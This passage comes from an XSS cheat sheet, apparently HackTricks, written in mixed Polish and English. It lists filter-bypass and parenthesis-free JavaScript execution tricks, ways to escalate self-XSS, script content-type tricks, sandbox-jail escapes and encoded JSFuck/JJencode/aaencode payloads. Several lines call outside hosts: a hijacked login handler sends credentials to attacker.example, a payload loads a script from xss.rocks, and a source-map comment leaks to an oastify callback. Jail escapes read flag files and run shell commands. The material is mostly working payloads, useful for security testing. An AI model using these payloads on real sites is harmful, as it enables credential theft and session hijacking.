Istotna uwaga dotycząca zakresu: `const`/`let` zadeklarowane wewnątrz `eval()` mają zakres blokowy i NIE tworzą globals; nie będą dostępne dla późniejszych skryptów. Użyj dynamicznie wstrzykiwanego elementu `<script>`, żeby zdefiniować globalne, nieprzypisywalne hooks, gdy to konieczne (np. to hijack a form handler):
```javascript
var s = document.createElement('script');
s.textContent = "const DoLogin = () => {const pwd = Trim(FormInput.InputPassword.value); const user = Trim(FormInput.InputUtente.value); fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd));}";
document.head.appendChild(s);
```
Źródło: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval

### Unicode Encode — wykonanie JS
```javascript
alert(1)
alert(1)
alert(1)
```
### JavaScript bypass blacklists techniki

**Stringi**
```javascript
"thisisastring"
'thisisastrig'
`thisisastring`
/thisisastring/ == "/thisisastring/"
/thisisastring/.source == "thisisastring"
"\h\e\l\l\o"
String.fromCharCode(116,104,105,115,105,115,97,115,116,114,105,110,103)
"\x74\x68\x69\x73\x69\x73\x61\x73\x74\x72\x69\x6e\x67"
"\164\150\151\163\151\163\141\163\164\162\151\156\147"
"\u0074\u0068\u0069\u0073\u0069\u0073\u0061\u0073\u0074\u0072\u0069\u006e\u0067"
"\u{74}\u{68}\u{69}\u{73}\u{69}\u{73}\u{61}\u{73}\u{74}\u{72}\u{69}\u{6e}\u{67}"
"\a\l\ert\(1\)"
atob("dGhpc2lzYXN0cmluZw==")
eval(8680439..toString(30))(983801..toString(36))
```
**Specjalne sekwencje ucieczki**
```javascript
"\b" //backspace
"\f" //form feed
"\n" //new line
"\r" //carriage return
"\t" //tab
"\b" //backspace
"\f" //form feed
"\n" //new line
"\r" //carriage return
"\t" //tab
// Any other char escaped is just itself
```
**Zastępowanie spacji w kodzie JS**
```javascript
<TAB>
/**/
```
**JavaScript comments (z** [**JavaScript Comments**](#javascript-comments) **sztuczki)**
```javascript
//This is a 1 line comment
/* This is a multiline comment*/
<!--This is a 1line comment
#!This is a 1 line comment, but "#!" must to be at the beggining of the first line
-->This is a 1 line comment, but "-->" must to be at the beggining of the first line
```
**JavaScript new lines (z** [**JavaScript new line**](#javascript-new-lines) **triku)**
```javascript
//Javascript interpret as new line these chars:
String.fromCharCode(10)
alert("//\nalert(1)") //0x0a
String.fromCharCode(13)
alert("//\ralert(1)") //0x0d
String.fromCharCode(8232)
alert("//\u2028alert(1)") //0xe2 0x80 0xa8
String.fromCharCode(8233)
alert("//\u2029alert(1)") //0xe2 0x80 0xa9
```
**JavaScript białe znaki**
```javascript
log=[];
function funct(){}
for(let i=0;i<=0x10ffff;i++){
try{
eval(`funct${String.fromCodePoint(i)}()`);
log.push(i);
}
catch(e){}
}
console.log(log)
//9,10,11,12,13,32,160,5760,8192,8193,8194,8195,8196,8197,8198,8199,8200,8201,8202,8232,8233,8239,8287,12288,65279

//Either the raw characters can be used or you can HTML encode them if they appear in SVG or HTML attributes:
<img/src/onerror=alert&#65279;(1)>
```
**Javascript wewnątrz komentarza**
```javascript
//If you can only inject inside a JS comment, you can still leak something
//If the user opens DevTools request to the indicated sourceMappingURL will be send

//# sourceMappingURL=https://evdr12qyinbtbd29yju31993gumlaby0.oastify.com
```
**JavaScript bez nawiasów**
```javascript
// By setting location
window.location='javascript:alert\x281\x29'
x=new DOMMatrix;matrix=alert;x.a=1337;location='javascript'+':'+x
// or any DOMXSS sink such as location=name

// Backtips
// Backtips pass the string as an array of lenght 1
alert`1`

// Backtips + Tagged Templates + call/apply
eval`alert\x281\x29` // This won't work as it will just return the passed array
setTimeout`alert\x281\x29`
eval.call`${'alert\x281\x29'}`
eval.apply`${[`alert\x281\x29`]}`
[].sort.call`${alert}1337`
[].map.call`${eval}\\u{61}lert\x281337\x29`

// To pass several arguments you can use
function btt(){
console.log(arguments);
}
btt`${'arg1'}${'arg2'}${'arg3'}`

//It's possible to construct a function and call it
Function`x${'alert(1337)'}x`

// .replace can use regexes and call a function if something is found
"a,".replace`a${alert}` //Initial ["a"] is passed to str as "a," and thats why the initial string is "a,"
"a".replace.call`1${/./}${alert}`
// This happened in the previous example
// Change "this" value of call to "1,"
// match anything with regex /./
// call alert with "1"
"a".replace.call`1337${/..../}${alert}` //alert with 1337 instead

// Using Reflect.apply to call any function with any argumnets
Reflect.apply.call`${alert}${window}${[1337]}` //Pass the function to call (“alert”), then the “this” value to that function (“window”) which avoids the illegal invocation error and finally an array of arguments to pass to the function.
Reflect.apply.call`${navigation.navigate}${navigation}${[name]}`
// Using Reflect.set to call set any value to a variable
Reflect.set.call`${location}${'href'}${'javascript:alert\x281337\x29'}` // It requires a valid object in the first argument (“location”), a property in the second argument and a value to assign in the third.



// valueOf, toString
// These operations are called when the object is used as a primitive
// Because the objet is passed as "this" and alert() needs "window" to be the value of "this", "window" methods are used
valueOf=alert;window+''
toString=alert;window+''


// Error handler
window.onerror=eval;throw"=alert\x281\x29";
onerror=eval;throw"=alert\x281\x29";
<img src=x onerror="window.onerror=eval;throw'=alert\x281\x29'">
{onerror=eval}throw"=alert(1)" //No ";"
onerror=alert //No ";" using new line
throw 1337
// Error handler + Special unicode separators
eval("onerror=\u2028alert\u2029throw 1337");
// Error handler + Comma separator
// The comma separator goes through the list and returns only the last element
var a = (1,2,3,4,5,6) // a = 6
throw onerror=alert,1337 // this is throw 1337, after setting the onerror event to alert
throw onerror=alert,1,1,1,1,1,1337
// optional exception variables inside a catch clause.
try{throw onerror=alert}catch{throw 1}


// Has instance symbol
'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}
'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}
// The “has instance” symbol allows you to customise the behaviour of the instanceof operator, if you set this symbol it will pass the left operand to the function defined by the symbol.

```
- [https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md](https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md)
- [https://portswigger.net/research/javascript-without-parentheses-using-dommatrix](https://portswigger.net/research/javascript-without-parentheses-using-dommatrix)

**Dowolne wywołanie funkcji (alert)**
```javascript
//Eval like functions
eval('ale'+'rt(1)')
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Function('ale'+'rt(10)')``;
[].constructor.constructor("alert(document.domain)")``
[]["constructor"]["constructor"]`$${alert()}```
import('data:text/javascript,alert(1)')

//General function executions
`` //Can be use as parenthesis
alert`document.cookie`
alert(document['cookie'])
with(document)alert(cookie)
(alert)(1)
(alert(1))in"."
a=alert,a(1)
[1].find(alert)
window['alert'](0)
parent['alert'](1)
self['alert'](2)
top['alert'](3)
this['alert'](4)
frames['alert'](5)
content['alert'](6)
[7].map(alert)
[8].find(alert)
[9].every(alert)
[10].filter(alert)
[11].findIndex(alert)
[12].forEach(alert);
top[/al/.source+/ert/.source](1)
top[8680439..toString(30)](1)
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
$='e'; x='ev'+'al'; x=this[x]; y='al'+$+'rt(1)'; y=x(y); x(y)
x='ev'+'al'; x=this[x]; y='ale'+'rt(1)'; x(x(y))
this[[]+('eva')+(/x/,new Array)+'l'](/xxx.xxx.xxx.xxx.xx/+alert(1),new Array)
globalThis[`al`+/ert/.source]`1`
this[`al`+/ert/.source]`1`
[alert][0].call(this,1)
window['a'+'l'+'e'+'r'+'t']()
window['a'+'l'+'e'+'r'+'t'].call(this,1)
top['a'+'l'+'e'+'r'+'t'].apply(this,[1])
(1,2,3,4,5,6,7,8,alert)(1)
x=alert,x(1)
[1].find(alert)
top["al"+"ert"](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
al\u0065rt`1`
top['al\145rt'](1)
top['al\x65rt'](1)
top[8680439..toString(30)](1)
<svg><animate onbegin=alert() attributeName=x></svg>
```
## **DOM vulnerabilities**

There is **JS code** that is using **unsafely data controlled by an attacker** like `location.href` . An attacker, could abuse this to execute arbitrary JS code.\
**Z powodu rozbudowania wyjaśnienia** [**DOM vulnerabilities it was moved to this page**](dom-xss.md)**:**


{{#ref}}
dom-xss.md
{{#endref}}

Tam znajdziesz szczegółowe **wyjaśnienie czym są DOM vulnerabilities, jak są wywoływane i jak je eksploatować**.\
Ponadto, nie zapomnij, że **na końcu wspomnianego wpisu** możesz znaleźć wyjaśnienie dotyczące [**DOM Clobbering attacks**](dom-xss.md#dom-clobbering).

### Upgrading Self-XSS

### Cookie XSS

If you can trigger a XSS by sending the payload inside a cookie, this is usually a self-XSS. However, if you find a **vulnerable subdomain to XSS**, you could abuse this XSS to inject a cookie in the whole domain managing to trigger the cookie XSS in the main domain or other subdomains (the ones vulnerable to cookie XSS). For this you can use the cookie tossing attack:


{{#ref}}
../hacking-with-cookies/cookie-tossing.md
{{#endref}}

You can find a great abuse of this technique in [**this blog post**](https://nokline.github.io/bugbounty/2024/06/07/Zoom-ATO.html).

### Sending your session to the admin

Może się zdarzyć, że użytkownik udostępni swój profil administratorowi, a jeśli self XSS znajduje się w profilu użytkownika i administrator uzyska do niego dostęp, to uruchomi podatność.

### Session Mirroring

If you find some self XSS and the web page have a **session mirroring for administrators**, for example allowing clients to ask for help an in order for the admin to help you he will be seeing what you are seeing in your session but from his session.

Możesz spowodować, że **administrator uruchomi twój self XSS** i przechwycić jego cookies/sesję.

## Inne obejścia

### Omijanie sanitizacji przez WASM linear-memory template overwrite

When a web app uses Emscripten/WASM, constant strings (like HTML format stubs) live in writable linear memory. A single in‑WASM overflow (e.g., unchecked memcpy in an edit path) can corrupt adjacent structures and redirect writes to those constants. Overwriting a template such as "<article><p>%.*s</p></article>" to "<img src=1 onerror=%.*s>" turns sanitized input into a JavaScript handler value and yields immediate DOM XSS on render.

Sprawdź dedykowaną stronę z workflow eksploatacji, DevTools memory helpers i środkami obronnymi:

{{#ref}}
wasm-linear-memory-template-overwrite-xss.md
{{#endref}}


### Normalised Unicode

You could check is the **reflected values** are being **unicode normalized** in the server (or in the client side) and abuse this functionality to bypass protections. [**Find an example here**](../unicode-injection/index.html#xss-cross-site-scripting).

### PHP FILTER_VALIDATE_EMAIL flag Bypass
```javascript
"><svg/onload=confirm(1)>"@x.y
```
### Ruby-On-Rails bypass

Z powodu **RoR mass assignment** cudzysłowy są wstawiane do HTML, dzięki czemu ograniczenie dotyczące cudzysłowów zostaje obejście i można dodać dodatkowe pola (onfocus) wewnątrz znacznika.\
Przykład formularza ([from this report](https://hackerone.com/reports/709336)), jeśli wyślesz payload:
```
contact[email] onfocus=javascript:alert('xss') autofocus a=a&form_type[a]aaa
```
Para "Key","Value" zostanie zwrócona w ten sposób:
```
{" onfocus=javascript:alert(&#39;xss&#39;) autofocus a"=>"a"}
```
Wtedy zostanie wstawiony atrybut onfocus i wystąpi XSS.

### Specjalne kombinacje
```html
<iframe/src="data:text/html,<svg onload=alert(1)>">
<input type=image src onerror="prompt(1)">
<svg onload=alert(1)//
<img src="/" =_=" title="onerror='prompt(1)'">
<img src='1' onerror='alert(0)' <
<script x> alert(1) </script 1=2
<script x>alert('XSS')<script y>
<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
<svg////////onload=alert(1)>
<svg id=x;onload=alert(1)>
<svg id=`x`onload=alert(1)>
<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
<script>$=1,alert($)</script>
<script ~~~>confirm(1)</script ~~~>
<script>$=1,\u0061lert($)</script>
<</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
<</script/script><script ~~~>\u0061lert(1)</script ~~~>
</style></scRipt><scRipt>alert(1)</scRipt>
<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
<svg><x><script>alert('1'&#41</x>
<iframe src=""/srcdoc='<svg onload=alert(1)>'>
<svg><animate onbegin=alert() attributeName=x></svg>
<img/id="alert('XSS')\"/alt=\"/\"src=\"/\"onerror=eval(id)>
<img src=1 onerror="s=document.createElement('script');s.src='http://xss.rocks/xss.js';document.body.appendChild(s);">
(function(x){this[x+`ert`](1)})`al`
window[`al`+/e/[`ex`+`ec`]`e`+`rt`](2)
document['default'+'View'][`\u0061lert`](3)
```
### XSS z wstrzyknięciem nagłówka w odpowiedzi 302

Jeśli odkryjesz, że możesz **wstrzykiwać nagłówki w odpowiedzi 302 Redirect** możesz spróbować **zmusić przeglądarkę do wykonania dowolnego javascript**. To **nie jest trywialne**, ponieważ nowoczesne przeglądarki nie interpretują ciała odpowiedzi HTTP, jeśli status HTTP to 302, więc sam payload cross-site scripting jest bezużyteczny.

W [**this report**](https://www.gremwell.com/firefox-xss-302) i [**this one**](https://www.hahwul.com/2020/10/03/forcing-http-redirect-xss/) możesz przeczytać, jak przetestować kilka protokołów w Location header i sprawdzić, czy któryś z nich pozwala przeglądarce zbadać i wykonać XSS payload znajdujący się w body.\
Znane wcześniej protokoły: `mailto://`, `//x:1/`, `ws://`, `wss://`, _empty Location header_, `resource://`.

### Tylko litery, cyfry i kropki

Jeśli jesteś w stanie wskazać **callback**, który javascript ma **wykonać**, ograniczony do tych znaków. [**Read this section of this post**](#javascript-function) aby dowiedzieć się, jak wykorzystać to zachowanie.

### Prawidłowe Content-Types `<script>` do XSS

(From [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) Jeśli spróbujesz załadować skrypt z **content-type** takim jak `application/octet-stream`, Chrome zgłosi następujący błąd:

> Refused to execute script from ‘[https://uploader.c.hc.lc/uploads/xxx'](https://uploader.c.hc.lc/uploads/xxx') because its MIME type (‘application/octet-stream’) is not executable, and strict MIME type checking is enabled.

Jedynymi **Content-Type**s, które pozwolą Chrome uruchomić **loaded script**, są te zawarte w const **`kSupportedJavascriptTypes`** z [https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third_party/blink/common/mime_util/mime_util.cc](https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third_party/blink/common/mime_util/mime_util.cc)
```c
const char* const kSupportedJavascriptTypes[] = {
"application/ecmascript",
"application/javascript",
"application/x-ecmascript",
"application/x-javascript",
"text/ecmascript",
"text/javascript",
"text/javascript1.0",
"text/javascript1.1",
"text/javascript1.2",
"text/javascript1.3",
"text/javascript1.4",
"text/javascript1.5",
"text/jscript",
"text/livescript",
"text/x-ecmascript",
"text/x-javascript",
};

```
### Typy skryptów dla XSS

(Z [**tutaj**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) Zatem, które typy można użyć do załadowania skryptu?
```html
<script type="???"></script>
```
Odpowiedź:

- **module** (domyślnie, nie trzeba wyjaśniać)
- [**webbundle**](https://web.dev/web-bundles/): Web Bundles to funkcja, która pozwala zapakować zestaw danych (HTML, CSS, JS…) w plik **`.wbn`**.
```html
<script type="webbundle">
{
"source": "https://example.com/dir/subresources.wbn",
"resources": ["https://example.com/dir/a.js", "https://example.com/dir/b.js", "https://example.com/dir/c.png"]
}
</script>
The resources are loaded from the source .wbn, not accessed via HTTP
```
- [**importmap**](https://github.com/WICG/import-maps)**:** Pozwala ulepszyć składnię importu
```html
<script type="importmap">
{
"imports": {
"moment": "/node_modules/moment/src/moment.js",
"lodash": "/node_modules/lodash-es/lodash.js"
}
}
</script>

<!-- With importmap you can do the following -->
<script>
import moment from "moment"
import { partition } from "lodash"
</script>
```
To zachowanie zostało wykorzystane w [**this writeup**](https://github.com/zwade/yaca/tree/master/solution) do ponownego przypisania biblioteki do eval — nadużycie tego może spowodować XSS.

- [**speculationrules**](https://github.com/WICG/nav-speculation)**:** Funkcja ta służy głównie do rozwiązania niektórych problemów spowodowanych pre-renderingiem. Działa w następujący sposób:
```html
<script type="speculationrules">
{
"prerender": [
{ "source": "list", "urls": ["/page/2"], "score": 0.5 },
{
"source": "document",
"if_href_matches": ["https://*.wikipedia.org/**"],
"if_not_selector_matches": [".restricted-section *"],
"score": 0.1
}
]
}
</script>
```
### Web Content-Types prowadzące do XSS

(Z [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) Następujące Content-Types mogą uruchamiać XSS we wszystkich przeglądarkach:

- text/html
- application/xhtml+xml
- application/xml
- text/xml
- image/svg+xml
- text/plain (?? nie ma go na liście, ale chyba widziałem to w CTF)
- application/rss+xml (wyłączone)
- application/atom+xml (wyłączone)

W innych przeglądarkach inne **`Content-Types`** mogą być użyte do wykonania dowolnego JS, sprawdź: [https://github.com/BlackFan/content-type-research/blob/master/XSS.md](https://github.com/BlackFan/content-type-research/blob/master/XSS.md)

### xml Content Type

Jeśli strona zwraca content-type text/xml, możliwe jest zadeklarowanie namespace i wykonanie dowolnego JS:
```xml
<xml>
<text>hello<img src="1" onerror="alert(1)" xmlns="http://www.w3.org/1999/xhtml" /></text>
</xml>

<!-- Heyes, Gareth. JavaScript for hackers: Learn to think like a hacker (p. 113). Kindle Edition. -->
```
### Specjalne wzorce zastępowania

Gdy używane jest coś takiego jak **`"some {{template}} data".replace("{{template}}", <user_input>)`**. Atakujący może użyć [**special string replacements**](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace#specifying_a_string_as_the_replacement) aby spróbować obejść niektóre zabezpieczenia: `` "123 {{template}} 456".replace("{{template}}", JSON.stringify({"name": "$'$`alert(1)//"})) ``

Na przykład w [**this writeup**](https://gitea.nitowa.xyz/nitowa/PlaidCTF-YACA), użyto tego do **scape a JSON string** wewnątrz skryptu, co pozwoliło na wykonanie dowolnego kodu.

### Chrome Cache to XSS


{{#ref}}
chrome-cache-to-xss.md
{{#endref}}

### XS Jails Escape

Jeśli masz do dyspozycji tylko ograniczony zestaw znaków, sprawdź te inne prawidłowe rozwiązania problemów XSJail:
```javascript
// eval + unescape + regex
eval(unescape(/%2f%0athis%2econstructor%2econstructor(%22return(process%2emainModule%2erequire(%27fs%27)%2ereadFileSync(%27flag%2etxt%27,%27utf8%27))%22)%2f/))()
eval(unescape(1+/1,this%2evalueOf%2econstructor(%22process%2emainModule%2erequire(%27repl%27)%2estart()%22)()%2f/))

// use of with
with(console)log(123)
with(/console.log(1)/index.html)with(this)with(constructor)constructor(source)()
// Just replace console.log(1) to the real code, the code we want to run is:
//return String(process.mainModule.require('fs').readFileSync('flag.txt'))

with(process)with(mainModule)with(require('fs'))return(String(readFileSync('flag.txt')))
with(k='fs',n='flag.txt',process)with(mainModule)with(require(k))return(String(readFileSync(n)))
with(String)with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)with(mainModule)with(require(k))return(String(readFileSync(n)))

//Final solution
with(
/with(String)
with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)
with(mainModule)
with(require(k))
return(String(readFileSync(n)))
/)
with(this)
with(constructor)
constructor(source)()

// For more uses of with go to challenge misc/CaaSio PSE in
// https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#misc/CaaSio%20PSE
```
Jeśli **wszystko jest undefined** przed wykonaniem niezaufanego kodu (jak w [**this writeup**](https://blog.huli.tw/2022/02/08/en/what-i-learned-from-dicectf-2022/index.html#miscx2fundefined55-solves)) możliwe jest wygenerowanie użytecznych obiektów "z niczego", aby nadużyć możliwości wykonania dowolnego niezaufanego kodu:

- Używając import()
```javascript
// although import "fs" doesn’t work, import('fs') does.
import("fs").then((m) => console.log(m.readFileSync("/flag.txt", "utf8")))
```
- Dostęp do `require` pośrednio

[Zgodnie z tym](https://stackoverflow.com/questions/28955047/why-does-a-module-level-return-statement-work-in-node-js/28955050#28955050) moduły są przez Node.js opakowywane w funkcję, w ten sposób:
```javascript
;(function (exports, require, module, __filename, __dirname) {
// our actual module code
})
```
Dlatego, jeśli z tego modułu możemy **wywołać inną funkcję**, możliwe jest użycie `arguments.callee.caller.arguments[1]` z tej funkcji, aby uzyskać dostęp do **`require`**:
```javascript
;(function () {
return arguments.callee.caller.arguments[1]("fs").readFileSync(
"/flag.txt",
"utf8"
)
})()
```
W podobny sposób jak w poprzednim przykładzie, możliwe jest **użycie obsługi błędów** w celu dostępu do **wrapper** modułu i uzyskania funkcji **`require`**:
```javascript
try {
null.f()
} catch (e) {
TypeError = e.constructor
}
Object = {}.constructor
String = "".constructor
Error = TypeError.prototype.__proto__.constructor
function CustomError() {
const oldStackTrace = Error.prepareStackTrace
try {
Error.prepareStackTrace = (err, structuredStackTrace) =>
structuredStackTrace
Error.captureStackTrace(this)
this.stack
} finally {
Error.prepareStackTrace = oldStackTrace
}
}
function trigger() {
const err = new CustomError()
console.log(err.stack[0])
for (const x of err.stack) {
// use x.getFunction() to get the upper function, which is the one that Node.js adds a wrapper to, and then use arugments to get the parameter
const fn = x.getFunction()
console.log(String(fn).slice(0, 200))
console.log(fn?.arguments)
console.log("=".repeat(40))
if ((args = fn?.arguments)?.length > 0) {
req = args[1]
console.log(req("child_process").execSync("id").toString())
}
}
}
trigger()
```
### Obfuscation & Advanced Bypass

- **Różne obfuscations na jednej stronie:** [**https://aem1k.com/aurebesh.js/**](https://aem1k.com/aurebesh.js/)
- [https://github.com/aemkei/katakana.js](https://github.com/aemkei/katakana.js)
- [https://javascriptobfuscator.herokuapp.com/](https://javascriptobfuscator.herokuapp.com)
- [https://skalman.github.io/UglifyJS-online/](https://skalman.github.io/UglifyJS-online/)
- [http://www.jsfuck.com/](http://www.jsfuck.com)
- Bardziej zaawansowany JSFuck: [https://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce](https://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce)
- [http://utf-8.jp/public/jjencode.html](http://utf-8.jp/public/jjencode.html)
- [https://utf-8.jp/public/aaencode.html](https://utf-8.jp/public/aaencode.html)
- [https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses](https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses)
```javascript
//Katana
<script>
([,ウ,,,,ア]=[]+{}
,[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()
</script>
```

```javascript
//JJencode
<script>$=~[];$={___:++$,$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$:({}+"")[$],$_$:($[$]+"")[$],_$:++$,$_:(!""+"")[$],$__:++$,$_$:++$,$__:({}+"")[$],$_:++$,$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$=($.$+"")[$.__$])+((!$)+"")[$._$]+($.__=$.$_[$.$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$=$.$+(!""+"")[$._$]+$.__+$._+$.$+$.$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$+"\""+$.$_$_+(![]+"")[$._$_]+$.$_+"\\"+$.__$+$.$_+$._$_+$.__+"("+$.___+")"+"\"")())();</script>
```

```javascript
//JSFuck
<script>
(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()
</script>
```

```javascript
//aaencode
ﾟωﾟﾉ = /｀ｍ´）ﾉ ~┻━┻   / /*´∇｀*/["_"]
o = ﾟｰﾟ = _ = 3
c = ﾟΘﾟ = ﾟｰﾟ - ﾟｰﾟ
ﾟДﾟ = ﾟΘﾟ = (o ^ _ ^ o) / (o ^ _ ^ o)
ﾟДﾟ = {
ﾟΘﾟ: "_",
ﾟωﾟﾉ: ((ﾟωﾟﾉ == 3) + "_")[ﾟΘﾟ],
ﾟｰﾟﾉ: (ﾟωﾟﾉ + "_")[o ^ _ ^ (o - ﾟΘﾟ)],
ﾟДﾟﾉ: ((ﾟｰﾟ == 3) + "_")[ﾟｰﾟ],
}
ﾟДﾟ[ﾟΘﾟ] = ((ﾟωﾟﾉ == 3) + "_")[c ^ _ ^ o]
ﾟДﾟ["c"] = (ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ - ﾟΘﾟ]
ﾟДﾟ["o"] = (ﾟДﾟ + "_")[ﾟΘﾟ]
ﾟoﾟ =
ﾟДﾟ["c"] +
ﾟДﾟ["o"] +
(ﾟωﾟﾉ + "_")[ﾟΘﾟ] +
